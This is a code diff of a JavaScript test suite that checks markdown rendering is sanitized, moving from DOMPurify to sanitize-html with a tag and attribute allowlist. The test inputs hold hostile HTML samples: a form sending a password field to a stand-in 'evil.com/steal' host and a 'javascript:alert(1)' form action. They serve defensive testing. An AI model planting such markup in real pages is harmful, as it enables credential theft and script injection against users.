@@ -1,14 +1,41 @@
 const { expect } = require("chai");
 const { marked } = require("marked");
-const DOMPurify = require("isomorphic-dompurify");
+const sanitizeHtml = require("sanitize-html");
+
+const sanitizeOptions = {
+  allowedTags: sanitizeHtml.defaults.allowedTags.concat([
+    "img",
+    "video",
+    "input",
+    "details",
+    "summary",
+    "del",
+    "ins",
+    "sup",
+    "sub",
+  ]),
+  allowedAttributes: {
+    ...sanitizeHtml.defaults.allowedAttributes,
+    img: ["src", "srcset", "alt", "title", "width", "height", "loading"],
+    video: ["src", "controls", "title"],
+    input: ["type", "checked", "disabled"],
+    code: ["class"],
+    span: ["class"],
+    div: ["class"],
+    pre: ["class"],
+    td: ["align"],
+    th: ["align"],
+  },
+  allowedSchemes: ["http", "https", "mailto"],
+};
 
 /**
- * Helper that mirrors the server-side rendering pipeline in webview.ts:
- *   DOMPurify.sanitize(marked.marked(content, { headerIds: false, mangle: false }))
+ * Mirrors the server-side rendering pipeline in webview.ts:
+ *   sanitizeHtml(marked(content, opts), sanitizeOptions)
  */
 function renderAndSanitize(markdown) {
   const raw = marked(markdown, { headerIds: false, mangle: false });
-  return DOMPurify.sanitize(raw);
+  return sanitizeHtml(raw, sanitizeOptions);
 }
 
 describe("Markdown sanitization", function () {
@@ -110,11 +137,11 @@ describe("Markdown sanitization", function () {
       expect(html).to.not.include("<embed");
     });
 
-    it("strips form action with javascript: URL", function () {
+    it("strips form tag", function () {
       const html = renderAndSanitize(
-        '<form action="javascript:alert(1)"><input type="submit"></form>'
+        '<form action="https://evil.com/steal"><input type="text" name="password"></form>'
       );
-      expect(html).to.not.include("javascript:");
+      expect(html).to.not.include("<form");
     });
   });
 
